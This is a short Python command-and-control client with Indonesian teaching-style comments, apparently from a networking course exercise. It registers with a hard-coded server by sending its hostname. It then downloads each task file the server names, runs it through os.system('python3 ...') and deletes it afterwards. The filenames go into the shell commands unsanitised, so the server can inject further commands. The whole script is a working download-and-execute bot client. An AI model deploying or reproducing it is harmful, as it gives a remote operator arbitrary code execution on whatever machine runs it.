# C&C - CLIENT

" join network "
import os

# import library socket karena akan menggunakan IPC socket
import socket

def comm(task):
    # definisikan IP server tujuan file akan diupload
    IP = "128.0.0.30"

    # definisikan port number proses di server
    PORT = 5555

    # definisikan ukuran buffer untuk mengirim
    B_SIZE = 1024

    # buat socket (apakah bertipe UDP atau TCP?)
    d = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    d.settimeout(15)

    # lakukan koneksi ke server
    d.connect((IP, PORT))

    # buka file bernama "hasil_download.txt bertipe byte
    # masih hard code, file harus ada dalam folder yang sama dengan script python
    f = open(task, "wb")

    # loop forever
    while 1:
        # terima pesan dari server
        line = d.recv(B_SIZE)

        # tulis pesan yang diterima dari server ke file telah dibuka sebelumnya (hasil_download.txt)
        f.write(line)
                
        # berhenti jika sudah tidak ada pesan yang dikirim
        if not line: break
        
    # tutup hasil_download.txt    
    f.close()

    #tutup socket
    d.close()

# definisikan tujuan IP server
TCP_IP = "128.0.0.30"

# definisikan port dari server yang akan terhubung
TCP_PORT = 5005

# definisikan ukuran buffer untuk mengirimkan pesan
BUFFER_SIZE = 1024

# definisikan pesan yang akan disampaikan
PESAN = socket.gethostname()

# buat socket TCP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(15)

# lakukan koneksi ke server dengan parameter IP dan Port yang telah didefinisikan
s.connect((TCP_IP, TCP_PORT))

# kirim pesan ke server
s.send(PESAN.encode())

# terima pesan dari server
data = s.recv(BUFFER_SIZE)

# tampilkan pesan/reply dari server
print("[{0}] joined".format(data.decode()))

" execute command "
s.send(PESAN.encode())

data = s.recv(BUFFER_SIZE)
ncmd = int(data.decode())

s.send(PESAN.encode())
print("[{0}] ready".format(PESAN))

for i in range(ncmd):
    data = s.recv(BUFFER_SIZE)
    task = data.decode()

    comm(task)
    
    print("[{0}] {1}".format(PESAN, task), end = " ")

    if os.system("python3 {0} > /dev/null".format(task)) == 0:
        s.send("0".encode()); print("success")
    else:
        s.send("1".encode()); print("failed")

    os.system("rm {0}".format(task))

data = s.recv(BUFFER_SIZE)
print("[{0}] returning".format(PESAN))

" leave network "
s.send(PESAN.encode())
print("[{0}] left".format(PESAN))

# tutup koneksi
s.close()